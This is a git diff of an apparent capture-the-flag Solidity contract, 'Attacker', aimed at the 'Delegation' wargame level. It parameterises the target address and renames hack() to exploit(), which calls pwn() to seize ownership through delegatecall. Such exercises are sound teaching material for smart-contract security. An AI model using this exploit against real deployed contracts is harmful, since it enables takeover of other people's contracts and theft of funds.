@@ -5,10 +5,14 @@ import "src/level06.sol";
 
 contract Attacker
 {
-    Delegation level06 = Delegation(0x9195EE144c2Fbd6B3EBC0FC085fe4769e214a542);
+    Delegation level06 = Delegation(address(0x49e29Da739e4e2a60C244068CCA68d6f5004ec5b));
+    constructor(address _level06)
+    {
+        level06 = Delegation(_level06);
+    }
     address myOwner = msg.sender;
 
-    function hack() external
+    function exploit() external
     {
         (bool success, ) = address(level06).call(abi.encodeWithSignature("pwn()"));
         require(success, "call not successful");
